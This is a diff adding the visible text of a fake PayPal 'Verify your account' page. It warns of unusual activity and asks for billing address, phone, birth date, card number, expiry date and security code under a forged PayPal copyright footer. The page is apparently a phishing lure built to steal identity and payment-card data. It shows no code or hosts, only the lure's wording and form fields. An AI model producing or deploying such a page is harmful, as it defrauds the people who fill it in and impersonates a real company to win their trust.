@@ -1,0 +1,28 @@
+Paypal
+Log Out
+Verify your account
+Dear Customer, We noticed some unusual activity. Please help us ensure your account is
+secure
+by answering a few question.
+Impact on account:
+High
+Update Billing Address
+First name
+Last Name
+Address Line
+City
+State
+Zip Code
+Phone Number
+Birth date
+Update credit/debit card
+Credit or debit card number
+Expiry date
+Security code
+Continue
+©1999-2018 Paypal, Inc. All rights reserved.
+|
+Privacy
+Legal
+Contact
+Feedback
